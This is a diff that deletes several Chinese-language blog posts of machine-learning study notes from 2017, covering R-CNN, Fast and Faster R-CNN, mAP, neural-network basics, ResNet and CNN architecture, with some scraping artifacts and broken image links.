@@ -285,475 +285,6 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-faster -rcnn"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/15/faster -rcnn/">faster-rcnn</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/15/faster -rcnn/" class="article-date">
-	  <time datetime="2017-10-15T15:53:56.000Z" itemprop="datePublished">2017-10-15</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="faster-rcnn"><a href="#faster-rcnn" class="headerlink" title="faster-rcnn"></a>faster-rcnn</h2><p>regionproposal  区域预测  </p>
-<p> spp（spatial pyramid pooling layer空间金字塔汇聚层  ） </p>
-<p> crop 修剪  warp 扭曲</p>
-<p><a href="http://blog.csdn.net/eliudragon/article/details/78189491" target="_blank" rel="noopener">http://blog.csdn.net/eliudragon/article/details/78189491</a>    参考论文</p>
-<p><a href="http://blog.csdn.net/u012968002/article/details/78542128" target="_blank" rel="noopener">http://blog.csdn.net/u012968002/article/details/78542128</a></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif" alt="clipboard.png"></p>
-<p> faster RCNN可以简单地看做“区域生成网络+fast RCNN“的系统，用区域生成网络代替fast RCNN中的Selective Search方法。本篇论文着重解决了这个系统中的三个问题： </p>
-<p>\1. 如何设计区域生成网络 </p>
-<p>\2. 如何训练区域生成网络 </p>
-<p>\3. 如何让区域生成网络和fast RCNN网络共享特征提取网络</p>
-<p><strong>spp  net</strong> : 加入spatial pyramid pooling layer空间金字塔汇聚层，实现数据的多尺</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif" alt="clipboard.png"></p>
-<p>Fast R-CNN整体结构</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="clipboard.png"></p>
-<p>如图，FastR-CNN的网络有两个输出层，</p>
-<p>一个softmax，</p>
-<p>一个bboxregressor（相对的R-CNN,SPP Net中分类和回归是两个部分，这里集成在了同一个网络中）。</p>
-<p>而且加入了一个RoIpooling layer（类似于一个尺度的Spatial Pyramid Pooling Layer（SPP）SPP layer（用于任意尺寸图像输入，固定图像输出））。注意：FastR-CNN提取建议区域的方法依然是selectsearch。</p>
-<p>。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image008.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image010.gif" alt="clipboard.png"></p>
-<p>RPN的网络结构类似于FR-CNN，连接与最后卷基层输出的feature map，有一个RoI层，两个输出层，一个输出滑窗为建议区域的概率，另一个输出bbox回归的offset。其训练方式也类似于FR-CNN。注意：RPN与FR-CNN共用卷积层。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-物体识别"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/14/物体识别/">物体识别</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/14/物体识别/" class="article-date">
-	  <time datetime="2017-10-14T15:53:56.000Z" itemprop="datePublished">2017-10-14</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="物体识别"><a href="#物体识别" class="headerlink" title="物体识别"></a>物体识别</h2><p>目标检测中衡量识别精度的指标是:</p>
-<p>Precision其实就是在识别出来的图片中，True positives所占的比率：   正确率</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image0011.gif" alt="105153511931.png"></p>
-<p>其中的n代表的是(True positives + False positives)，也就是系统一共识别出来多少照片 。 </p>
-<p>在这一例子中，True positives为3，False positives为1，所以Precision值是 3/（3+1）=0.75。 </p>
-<p>意味着在识别出的结果中，飞机的图片占75%。</p>
-<p>Recall 是被正确识别出来的飞机个数与测试集中所有飞机的个数的比值：   召回率</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image002.gif" alt="105153607573.png"></p>
-<p>Recall的分母是(True positives +False negatives)，这两个值的和，可以理解为一共有多少张飞机的照片。 </p>
-<p>在这一例子中，True positives为3，False negatives为2，那么Recall值是 3/（3+2）=0.6。 </p>
-<p>意味着在所有的飞机图片中，60%的飞机被正确的识别成飞机.。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image0014.gif" alt="clipboard.png"></p>
-<p>mAP（mean average precision）。</p>
-<p>多个类别物体检测中，每一个类别都可以根据recall和precision绘制一条曲线，AP就是该曲线下的面积，mAP是多个类别AP的平均值</p>
-<p>ap averageprecision    平均正确率</p>
-<p><a href="https://www.zhihu.com/question/41540197" target="_blank" rel="noopener">https://www.zhihu.com/question/41540197</a>   map </p>
-<p>MAP(MeanAverage Precision)：单个主题的平均准确率是每篇相关文档检索出后的准确率的平均值。主集合的平均准确率(MAP)是每个主题的平均准确率的平均值。</p>
-<p> MAP 是反映系统在全部相关文档上性能的单值指标。系统检索出来的相关文档越靠前(rank 越高)，MAP就可能越高。如果系统没有返回相关文档，则准确率默认为0。</p>
-<p>在图像中，尤其是分类问题中应用AP，是一种评价ranking方式好不好的指标：</p>
-<p>举例来说，我有一个两类分类问题，分别5个样本，如果这个分类器性能达到完美的话，ranking结果应该是+1，+1，+1，+1，+1，-1，-1，-1，-1，-1.</p>
-<p>但是分类器预测的label，和实际的score肯定不会这么完美。按照从大到小来打分，我们可以计算两个指标：precision和recall。比如分类器认为打分由高到低选择了前四个，实际上这里面只有两个是正样本。此时的recall就是2（你能包住的正样本数）/5（总共的正样本数）=0.4，precision是2（你选对了的）/4（总共选的）=0.5.</p>
-<p>图像分类中，这个打分score可以由SVM得到：s=w^Tx+b就是每一个样本的分数。</p>
-<p>从上面的例子可以看出，其实precision，recall都是选多少个样本k的函数，很容易想到，如果我总共有1000个样本，那么我就可以像这样计算1000对P-R，并且把他们画出来，这就是PR曲线：</p>
-<p>这里有一个趋势，recall越高，precision越低。这是很合理的，因为假如说我把1000个全拿进来，那肯定正样本都包住了，recall=1，但是此时precision就很小了，因为我全部认为他们是正样本。recall=1时的precision的数值，等于正样本所占的比例。</p>
-<p>所以AP，average precision(平均正确率），就是这个曲线下的面积，这里average，等于是对recall取平均。</p>
-<p>而mean average precision的mean，是对所有类别取平均（每一个类当做一次二分类任务）。</p>
-<p>现在的图像分类论文基本都是用mAP作为标准。</p>
-<p>上图中有一个AP11，这是把recall从0,0.1,0.2.一直到1.0的11个点的precision取平均得到的结果。VOC08之后AP11已经被抛弃了。</p>
-<p>貌似从VOC08之后要求PR曲线必须单调下降了？这个不太确定。</p>
-<p>================================================</p>
-<p>1.使用AP会比accuracy要合理。对于accuracy，如果有9个负样本和一个正样本，那么即使分类器什么都不做全部判定为负样本accuracy也有90%。但是对于AP，recall=1那个点precision会掉到0.1.曲线下面积就会反映出来。</p>
-<p>2.在实际中计算AP时，如果是matlab的话，可以直接调用vl_feat中的vl_pr：<a href="https://link.zhihu.com/?target=http%3A//www.vlfeat.org/overview/plots-rank.html" target="_blank" rel="noopener">VLFeat - Tutorials</a></p>
-<p>这里面详细地给出了概念的解释以及计算方式。45)/2=0.64。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-RCNN"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/12/RCNN/">RCNN</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/12/RCNN/" class="article-date">
-	  <time datetime="2017-10-12T15:53:56.000Z" itemprop="datePublished">2017-10-12</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="RCNN"><a href="#RCNN" class="headerlink" title="RCNN"></a>RCNN</h2><p>RCNN算法分为4个步骤 </p>
-<p>- 一张图像生成1K~2K个候选区域 </p>
-<p>- 对每个候选区域，使用深度网络提取特征 </p>
-<p>- 特征送入每一类的SVM 分类器，判别是否属于该类 </p>
-<p>- 使用回归器精细修正候选框位置 </p>
-<p>a、找出候选框；b、利用CNN提取特征向量；c、利用SVM进行特征向量分类</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif" alt="clipboard.png"></p>
-<p><a href="http://blog.csdn.net/hjimce/article/details/50187029" target="_blank" rel="noopener">http://blog.csdn.net/hjimce/article/details/50187029</a></p>
-<p>RCNN 解决的是，“为什么不用CNN做classification呢？”</p>
-<p>（但是这个方法相当于过一遍network出bounding box，再过另一个出label，原文写的很不“elegant”</p>
-<p>Fast-RCNN 解决的是，“为什么不一起输出bounding box和label呢？”</p>
-<p>（但是这个时候用selectivesearch generate regional proposal的时间实在太长了</p>
-<p>Faster-RCNN 解决的是，“为什么还要用selective search呢？”</p>
-<p>于是就达到了real-time。开山之作确实是开山之作，但是也是顺应了“Deep learning 搞一切vision”这一潮流吧。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif" alt="clipboard.png"></p>
-<p>作者：Oh233</p>
-<p>链接：<a href="https://www.zhihu.com/question/35887527/answer/72884459" target="_blank" rel="noopener">https://www.zhihu.com/question/35887527/answer/72884459</a></p>
-<p>来源：知乎</p>
-<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-<p>   本篇博文主要讲解2014年CVPR上的经典paper：《Richfeature hierarchies for Accurate Object Detection and Segmentation》，这篇文章的算法思想又被称之为：R-CNN（Regions with Convolutional NeuralNetwork Features），是物体检测领域曾经获得state-of-art精度的经典文献。</p>
-<p>   这篇paper的思想，改变了物体检测的总思路，现在好多文献关于深度学习的物体检测的算法，基本上都是继承了这个思想，比如：《Spatial Pyramid Pooling in Deep Convolutional Networks forVisual Recognition》，所以学习经典算法，有助于我们以后搞物体检测的其它paper。</p>
-<p>fast-rcnn</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="clipboard.png"></p>
-<p>图1.快速R-CNN架构</p>
-<p>​     输入图像和多个感兴趣区域（RoI）被输入到完全卷积网络。 每个RoI被汇集到一个固定大小的特征映射中然后通过完全连接的层（FC）映射到特征向量。每个RoI网络有两个输出向量：softmax概率和每类边界框回归抵消。 架构是训练端到端的多任务丢失。</p>
-<p>Fast R-CNN输入为一张图像以及诸多的region proposals（RoI）。首先通过CNN提取到整幅图像的feature map  下采样层  （特征层），然后对于每一个RoI根据映射提取到自己的feature vector。然后输入到全连接层，输出为两个分支，一个为softmax层输出，输出的是K+1个类别的概率（包含一个背景类）。另一个输出是对于每类生成一个求精后的boundingbox。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-人工神经网络"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/05/人工神经网络/">人工神经网络</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/05/人工神经网络/" class="article-date">
-	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="人工神经网络"><a href="#人工神经网络" class="headerlink" title="人工神经网络"></a>人工神经网络</h2><p>人工神经网络最重要的是 :   分类</p>
-<p>神经网络分类： </p>
-<ol>
-<li><p>ANN（人工神经网络）</p>
-</li>
-<li><p>LSTM （循环神经网络）  时间共享</p>
-</li>
-<li><p>CNN（卷积神经网络）空间共享</p>
-<p>基本流程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分类样本--》训练样本--》建模--》测试样本--》结果</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p><a href="https://www.zhihu.com/question/22553761" target="_blank" rel="noopener">https://www.zhihu.com/question/22553761</a></p>
-<h4 id="空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联"><a href="#空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联" class="headerlink" title="空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）),  但是可以一层一层级联"></a>空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, <em>sigmoid</em> （或者 <em>tanh</em> ）),  但是可以一层一层级联</h4><p>​      这一层是下一层的输入。       </p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image002.gif" alt="clipboard.png"></p>
-<p>类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。</p>
-<p>在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image004.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image006.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image008.gif" alt="clipboard.png"></p>
-<p>其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。</p>
-<p>反向传播算法  ：  结果反向决定输入，不断调整权值，</p>
-<p>常用激活  函数  ：  logistic   Sigmoid    <em>sign , tanh</em></p>
-<h4 id="感知机："><a href="#感知机：" class="headerlink" title="感知机："></a>感知机：</h4><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image010.gif" alt="clipboard.png"></p>
-<p>其中激活函数 <em>act</em> 可以使用{<em>sign, sigmoid, tanh</em>}之一。</p>
-<p>l 激活函数使用符号函数 <em>sign</em> ，可求解损失函数最小化问题，通过梯度下降确定参数</p>
-<p>l 激活函数使用 <em>sigmoid</em> （或者 <em>tanh</em> ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数</p>
-<p>l 如果需要多分类，则事实上成为SoftmaxRegression</p>
-<p>l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。</p>
-<p>多层感知器</p>
-<p>感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。</p>
-<p>多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image012.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image014.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image016.gif" alt="clipboard.png"></p>
-<p>logistic   函数</p>
-<p>非对称：</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image018.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image020.gif" alt="clipboard.png"></p>
-<p>对称：</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image022.gif" alt="clipboard.png"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image024.gif" alt="clipboard.png"></p>
-<h3 id="反馈神经网络-BP神经网络"><a href="#反馈神经网络-BP神经网络" class="headerlink" title="反馈神经网络  BP神经网络"></a>反馈神经网络  BP神经网络</h3><p>Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比</p>
-<p>在Hebb学习规则中，学习信号简单地等于神经元的输出：</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image026.gif" alt="clipboard.png"></p>
-<p>用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下：</p>
-<p>∆Wij(k)=Wij(k+1)-Wij(k)=η<em>yi(k)</em>yj(k+1),式中η为学习速率</p>
-<p>权值调整量与输入输出的乘积成正比。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image028.gif" alt="clipboard.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-ResNet 残差网络"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/05/ResNet 残差网络/">ResNet 残差网络</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/05/ResNet 残差网络/" class="article-date">
-	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="ResNet-残差网络"><a href="#ResNet-残差网络" class="headerlink" title="ResNet 残差网络"></a>ResNet 残差网络</h2><p><a href="http://blog.csdn.net/wspba/article/details/56019373&gt;" target="_blank" rel="noopener">http://blog.csdn.net/wspba/article/details/56019373&gt;</a></p>
-<p><a href="https://www.zhihu.com/question/32246256" target="_blank" rel="noopener">https://www.zhihu.com/question/32246256</a>  过拟合</p>
-<p>优化函数越来越容易陷入局部最优解，梯度消失现象严重。        梯度衰减严重，低层信号基本接收不信号。  </p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image005.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image007.gif" alt="clipboard.png"></p>
-<p>ResNet——MSRA何凯明团队的Residual Networks，在2015年ImageNet上大放异彩，在ImageNet的classification、detection、localization以及COCO的detection和segmentation上均斩获了第一名的成绩，而且Deep ResidualLearning for Image Recognition也获得了CVPR2016的best paper，实在是实至名归。就让我们来观摩大神的这篇上乘之作。</p>
-<p>ResNet最根本的动机就是所谓的“退化”问题，即当模型的层次加深时，错误率却提高了，如下图：</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image009.gif" alt="220200258020.png"></p>
-<p>但是模型的深度加深，学习能力增强，因此更深的模型不应当产生比它更浅的模型更高的错误率。而这个“退化”问题产生的原因归结于优化难题，当模型变复杂时，SGD的优化变得更加困难，导致了模型达不到好的学习效果。</p>
-<p>针对这个问题，作者提出了一个Residual 残差网络的结构：</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image011.gif" alt="220201128938.png"></p>
-<p>即增加一个identitymapping（恒等映射），将原始所需要学的函数H(x)转换成F(x)+x，而作者认为这两种表达的效果相同，但是优化的难度却并不相同，作者假设F(x)的优化 会比H(x)简单的多。这一想法也是源于图像处理中的残差向量编码，通过一个reformulation，将一个问题分解成多个尺度直接的残差问题，能够很好的起到优化训练的效果。   </p>
-<p>这个Residual block通过shortcut connection实现，通过shortcut将这个block的输入和输出进行一个element-wise的加叠，这个简单的加法并不会给网络增加额外的参数和计算量，同时却可以大大增加模型的训练速度、提高训练效果，并且当模型的层数加深时，这个简单的结构能够很好的解决退化问题。</p>
-<p>接下来，作者就设计实验来证明自己的观点。</p>
-<p>首先构建了一个18层和一个34层的plain网络，即将所有层进行简单的铺叠，然后构建了一个18层和一个34层的residual网络，仅仅是在plain上插入了shortcut，而且这两个网络的参数量、计算量相同，并且和之前有很好效果的VGG-19相比，计算量要小很多。（36亿FLOPs VS 196亿FLOPs，FLOPs即每秒浮点运算次数。）这也是作者反复强调的地方，也是这个模型最大的优势所在。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg" alt="20205131506.jpeg"></p>
-<p>模型构建好后进行实验，在plain上观测到明显的退化现象，而且ResNet上不仅没有退化，34层网络的效果反而比18层的更好，而且不仅如此，ResNet的收敛速度比plain的要快得多。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image015.jpg" alt="20205639859.jpeg"></p>
-<p>对于shortcut的方式，作者提出了三个选项：</p>
-<p>A. 使用恒等映射，如果residual block的输入输出维度不一致，对增加的维度用0来填充；</p>
-<p>B. 在block输入输出维度一致时使用恒等映射，不一致时使用线性投影以保证维度一致；</p>
-<p>C. 对于所有的block均使用线性投影。</p>
-<p>对这三个选项都进行了实验，发现虽然C的效果好于B的效果好于A的效果，但是差距很小，因此线性投影并不是必需的，而使用0填充时，可以保证模型的复杂度最低，这对于更深的网络是更加有利的。</p>
-<p>进一步实验，作者又提出了deeper的residual block：</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image017.jpg" alt="20210432796.jpeg"></p>
-<p>这相当于对于相同数量的层又减少了参数量，因此可以拓展成更深的模型。于是作者提出了50、101、152层的ResNet，而且不仅没有出现退化问题，错误率也大大降低，同时计算复杂度也保持在很低的程度。</p>
-<p>这个时候ResNet的错误率已经把其他网络落下几条街了，但是似乎还并不满足，于是又搭建了更加变态的1202层的网络，对于这么深的网络，优化依然并不困难，但是出现了过拟合的问题，这是很正常的，作者也说了以后会对这个1202层的模型进行进一步的改进。（想想就可怕。）</p>
-<p>在文章的附录部分，作者又针对ResNet在其他几个任务的应用进行了解释，毕竟获得了第一名的成绩，也证明了ResNet强大的泛化能力，感兴趣的同学可以好好研究这篇论文，是非常有学习价值的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Covolutions Neural Netwrk"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/05/Covolutions Neural Netwrk/">深度神经网络的设计理念</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/05/Covolutions Neural Netwrk/" class="article-date">
-	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="http://www.sohu.com/a/134347664_642762&gt;" target="_blank" rel="noopener">http://www.sohu.com/a/134347664_642762&gt;</a></p>
-<p>卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 </p>
-<p>[INPUT - CONV - RELU - POOL - FC]          也就是  [输入-卷积-激活-池化-分类得分]</p>
-<p>Covolutions Neural Netwrk</p>
-<p>卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN）</p>
-<p>l 由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。</p>
-<p>l DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络）</p>
-<p>数据-》自学习-》结果</p>
-<p>输入-》 算法 -》输出</p>
-<p>空间共享</p>
-<p>计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。</p>
-<p>什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。</p>
-<p>比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。</p>
-<p>从LeNet到AlexNet</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="32919ad4d34.jpeg"></p>
-<p>image</p>
-<p>物体检测问题</p>
-<p>Region CNN YOLO</p>
-<p>去年FACEBOOK提出来的YOLO网络，也是进行物体检测，</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="clipboard.png"></p>
-<p>权重 W 与偏移量B  相同     不同的是输入的值</p>
-<p>我们使用三种主要类型的层来构建ConvNet体系结构：<strong>卷积层</strong>，<strong>池层</strong>和<strong>完全连接层</strong>（正如在常规神经网络中所见）。我们将堆叠这些层以形成一个完整的ConvNet <strong>架构</strong>。</p>
-<p><strong>ConvNet</strong></p>
-<p>C++中卷积神经网络的GPU实现</p>
-<p>一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整<a href="http://cs231n.stanford.edu/" target="_blank" rel="noopener">的基于Web的演示文稿</a>显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image008.gif" alt="clipboard.png"></p>
-<p>双曲正切函数是双曲函数中的一个函数。</p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image010.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image012.gif" alt="clipboard.png"></p>
-<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image014.gif" alt="clipboard.png"></p>
-<p>l 输入图像I。为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1]        2、 如果使用tanh激活函数，则归一化到[-1, 1]。</p>
-<p>l 多个卷积（C）-下采样（S）层。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。</p>
-<p>l 光栅化（X）。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。</p>
-<p>l 传统的多层感知器（N&amp;O）。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。</p>
-<p><strong>输入层-隐层：</strong></p>
-<p>是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 <em>sigmoid</em> 或 <em>tanh</em> ，那么这个隐层节点的输出应该是</p>
-<p>fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj)</p>
-<p>也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即</p>
-<p>f(x)=act(Θx+b)f(x)=act(Θx+b)</p>
